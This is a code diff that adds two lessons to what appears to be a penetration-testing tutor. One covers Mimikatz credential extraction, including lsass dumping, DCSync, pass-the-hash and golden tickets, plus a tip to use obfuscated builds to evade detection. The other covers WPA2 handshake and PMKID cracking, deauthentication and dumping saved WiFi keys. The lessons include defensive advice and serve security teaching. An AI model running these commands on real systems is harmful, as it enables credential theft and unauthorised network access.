@@ -1604,7 +1604,144 @@ LESSONS = {
     ],
   },
 
+  # ─────────────────────────────────────────────────────────────────────────
+  # MIMIKATZ — Windows Credential Extraction
+  # ─────────────────────────────────────────────────────────────────────────
+  "mimikatz": {
+    "title": "Mimikatz — Windows Credential Extraction",
+    "tldr": "Reads NTLM hashes, Kerberos tickets, and plaintext passwords directly from Windows memory (lsass.exe). Windows auth ONLY — cannot crack WiFi passwords.",
+    "what": (
+      "Mimikatz is a post-exploitation tool written by Benjamin Delpy that reads "
+      "credential data from the Windows Local Security Authority Subsystem Service "
+      "(lsass.exe). It extracts NTLM hashes, Kerberos tickets, WDigest plaintext "
+      "passwords (legacy systems), and DPAPI keys.\n\n"
+      "IMPORTANT: Mimikatz targets Windows authentication protocols ONLY.\n"
+      "It CANNOT crack WiFi passwords (WPA2 uses PBKDF2-HMAC-SHA1 — completely "
+      "different algorithm). For WiFi: use aircrack-ng or hashcat -m 22000."
+    ),
+    "how": (
+      "Mimikatz reads directly from lsass.exe process memory, which stores credentials "
+      "for all currently logged-on users. Windows needs these in memory to handle "
+      "re-authentication transparently."
+    ),
+    "phases": [
+      "1. Gain Administrator or SYSTEM privileges (required)",
+      "2. privilege::debug — enable SeDebugPrivilege to access lsass",
+      "3. Choose module: sekurlsa (memory), lsadump (SAM/DC), kerberos (tickets)",
+      "4. Run extraction command",
+      "5. Use output: crack hashes with hashcat, Pass-the-Hash, Golden Ticket",
+    ],
+    "commands": {
+      "Enable debug":           "privilege::debug",
+      "Dump everything":        "sekurlsa::logonpasswords",
+      "WDigest plaintext":      "sekurlsa::wdigest",
+      "Kerberos tickets":       "sekurlsa::tickets /export",
+      "Dump SAM (local)":       "lsadump::sam",
+      "LSA secrets":            "lsadump::lsa /patch",
+      "DCSync (domain admin)":  "lsadump::dcsync /domain:corp.local /user:krbtgt",
+      "Pass-the-Hash":          "sekurlsa::pth /user:Admin /domain:CORP /ntlm:HASH /run:cmd.exe",
+      "Golden Ticket":          "kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-X /krbtgt:HASH",
+      "Offline dump (stealthy)": "rundll32 comsvcs.dll MiniDump <lsass_pid> C:\\lsass.dmp full",
+      "Parse offline dump":     "sekurlsa::minidump lsass.dmp  →  sekurlsa::logonpasswords",
+    },
+    "flags": {
+      "privilege::debug":           "Enable SeDebugPrivilege — required before most commands",
+      "sekurlsa::logonpasswords":   "Dump all creds from lsass memory (NTLM + Kerberos + plaintext)",
+      "sekurlsa::wdigest":          "WDigest plaintext (pre-Win8.1 or registry re-enabled)",
+      "sekurlsa::tickets":          "List/export Kerberos tickets from memory",
+      "sekurlsa::pth":              "Pass-the-Hash — spawn process as user using NTLM hash",
+      "lsadump::sam":               "Dump local SAM database (needs SYSTEM)",
+      "lsadump::lsa /patch":        "Patch LSA and dump all LSA secrets",
+      "lsadump::dcsync":            "Mimic DC replication to pull any domain hash (no lsass touch)",
+      "kerberos::golden":           "Forge a Golden Ticket using krbtgt hash",
+      "sekurlsa::minidump":         "Point Mimikatz at an offline lsass.dmp file",
+    },
+    "defense": (
+      "Enable Credential Guard (virtualizes lsass — blocks Mimikatz entirely).\n"
+      "Add privileged accounts to Protected Users group.\n"
+      "Enable PPL (Protected Process Light) on lsass.\n"
+      "Disable WDigest via registry (prevents plaintext storage).\n"
+      "Monitor: Sysmon Event 10 (lsass process access), Windows Event 4648.\n"
+      "AMSI + EDR will flag mimikatz strings — use obfuscated builds in real engagements."
+    ),
+    "tips": [
+      "privilege::debug is almost always your first command — skip it and nothing works",
+      "lsadump::dcsync is the stealthiest domain hash dump — never touches lsass on the DC",
+      "sekurlsa::pth spawns a new process AS that user using the hash — no password needed",
+      "Offline dump (comsvcs.dll MiniDump) lets you extract creds on your own machine",
+      "Credential Guard = game over for standard Mimikatz. Look for NTLM relay or Kerberoasting instead",
+      "WDigest plaintext only works on pre-Win8.1 or if the attacker previously re-enabled it via registry",
+    ],
+  },
 
+  # ─────────────────────────────────────────────────────────────────────────
+  # WIFI CRACKING — WPA2 handshake capture and cracking
+  # ─────────────────────────────────────────────────────────────────────────
+  "wifi_cracking": {
+    "title": "WiFi Password Recovery and WPA2 Cracking",
+    "tldr": "Three completely different paths depending on what you have. netsh wlan (Windows saved), aircrack+hashcat (handshake), hcxdumptool (PMKID clientless). Mimikatz does NOT work on WiFi.",
+    "what": (
+      "WiFi WPA2 uses PBKDF2-HMAC-SHA1 key derivation — completely different from "
+      "Windows NTLM. The right tool depends entirely on your situation:\n"
+      "  PATH 1: Machine already has the WiFi saved → netsh wlan (no cracking needed)\n"
+      "  PATH 2: You have a .cap file → hashcat -m 22000 or aircrack-ng\n"
+      "  PATH 3: You have proximity to the AP → capture then crack"
+    ),
+    "how": (
+      "WPA2 handshake: When a client connects, a 4-packet EAPOL exchange proves "
+      "the client knows the password — without sending it. We capture this and run "
+      "a dictionary attack offline. The hash is PBKDF2-HMAC-SHA1(password + SSID, 4096 iterations).\n\n"
+      "PMKID: Modern APs broadcast the PMKID in the first EAPOL frame. "
+      "No client connection needed — just proximity to the AP."
+    ),
+    "phases": [
+      "PATH 1 — Saved WiFi on Windows machine:",
+      "  netsh wlan show profiles",
+      "  netsh wlan show profile name='SSID' key=clear  →  Key Content = plaintext",
+      "",
+      "PATH 2 — Capture + crack handshake:",
+      "  1. airmon-ng check kill  &&  airmon-ng start wlan0",
+      "  2. airodump-ng -c CH --bssid AP_MAC -w capture wlan0mon",
+      "  3. aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon  (force reconnect)",
+      "  4. hcxpcapngtool -o capture.hc22000 capture-01.cap",
+      "  5. hashcat -m 22000 capture.hc22000 rockyou.txt",
+      "",
+      "PATH 3 — PMKID (clientless):",
+      "  hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
+      "  hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng",
+      "  hashcat -m 22000 pmkid.hc22000 rockyou.txt",
+    ],
+    "commands": {
+      "Enable monitor mode":    "airmon-ng check kill && airmon-ng start wlan0",
+      "Survey APs":             "airodump-ng wlan0mon",
+      "Lock + capture":         "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
+      "Deauth (force handshake)": "aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon",
+      "Convert to hashcat fmt": "hcxpcapngtool -o capture.hc22000 capture-01.cap",
+      "Crack WPA2 (hashcat)":   "hashcat -m 22000 capture.hc22000 rockyou.txt",
+      "Crack with rules":       "hashcat -m 22000 capture.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+      "Crack WPA2 (aircrack)":  "aircrack-ng capture-01.cap -w rockyou.txt",
+      "PMKID capture":          "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
+      "Dump saved WiFi (Win)":  "netsh wlan show profile name='NetworkName' key=clear",
+      "Dump all saved (Win)":   "netsh wlan show profiles | Select-String 'All User Profile'",
+      "Dump all saved (Linux)": "cat /etc/NetworkManager/system-connections/*.nmconnection | grep psk",
+    },
+    "defense": (
+      "Use WPA3 — immune to PMKID and offline dictionary attacks.\n"
+      "Use a long random passphrase (20+ chars) — defeats wordlist attacks.\n"
+      "Enable 802.11w (Management Frame Protection) — blocks deauth attacks.\n"
+      "Deploy WIDS (Wireless IDS) to detect rogue APs and deauth floods.\n"
+      "Enterprise networks: use WPA2/3-Enterprise with certificates, not passwords."
+    ),
+    "tips": [
+      "PATH 1 (netsh wlan) is fastest if you already have machine access — no cracking needed",
+      "hashcat -m 22000 is 10-100x faster than aircrack-ng on a GPU",
+      "PMKID attack requires zero clients — just be near the AP for a few seconds",
+      "Monitor mode requires an adapter that supports it — built-in laptop WiFi usually fails",
+      "Alfa AWUS036ACM (MT7612U) is the best dual-band adapter for this workflow",
+      "Add -r best64.rule to hashcat for password mutations (Password1!, p@ssword, etc.)",
+      "WEP is trivially broken — 50k IVs with aireplay-ng ARP replay + aircrack-ng",
+    ],
+  },
 
 }  # End LESSONS dict
 
@@ -1821,6 +1958,22 @@ KEYWORD_MAP = {
   "persistence linux": "mitre_persistence",
   "persistence windows": "mitre_persistence",
   "cobalt strike": "mitre_c2",
+
+  # WiFi / wireless — explicit routing
+  "wifi": "aircrack", "wifi password": "aircrack", "wifi crack": "aircrack",
+  "wpa2": "aircrack", "wpa": "aircrack", "wep": "aircrack",
+  "wireless": "aircrack", "handshake": "aircrack", "pmkid": "aircrack",
+  "airodump": "aircrack", "aireplay": "aircrack", "airmon": "aircrack",
+  "hcxdumptool": "aircrack", "hcxpcapngtool": "aircrack",
+  "netsh wlan": "aircrack", "saved wifi": "aircrack",
+  "wifi password recovery": "aircrack", "recover wifi password": "aircrack",
+  "can mimikatz crack wifi": "aircrack", "mimikatz wifi": "aircrack",
+  "use mimikatz for wifi": "aircrack", "mimikatz wpa": "aircrack",
+  "wifi hacking": "aircrack", "crack handshake": "aircrack",
+  "capture handshake": "aircrack", "evil twin": "aircrack",
+  "rogue ap": "aircrack", "deauth attack": "aircrack",
+  "monitor mode": "aircrack", "packet injection": "aircrack",
+  "alfa": "aircrack", "awus036acm": "aircrack",
 }
 
 
